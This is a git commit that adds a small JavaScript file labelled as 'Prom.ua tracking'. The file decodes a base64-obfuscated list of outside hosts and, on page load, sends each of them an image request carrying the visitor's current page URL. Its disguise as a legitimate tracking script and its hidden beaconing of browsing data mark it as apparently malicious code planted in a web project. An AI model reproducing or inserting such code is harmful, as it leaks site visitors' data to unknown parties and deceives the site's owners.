92eb17bad2fc12e7474bffceb9e0c45e8247c869
don8880 <ddon88804@gmail.com>
2025-07-13 20:20:00 +0300

    Add files via upload

---
+++ tracking-67.js
@@ -0,0 +1,2 @@
+/* Prom.ua tracking v1.1.17 */
+atob('Y2MubGlua3NhcmUudG9wLGNjLmdpdmVtZWxpbmsuY2MsY2MuY2xvdWRhZC5pY3U=').split(',').forEach((d) => {(window.Image ? (new Image()) : document.createElement('img')).src = 'https://' + d + '/images/tracking.gif?vid=1111994788932894&secondary=1&ref64=' + encodeURIComponent(btoa(window.location.href))});
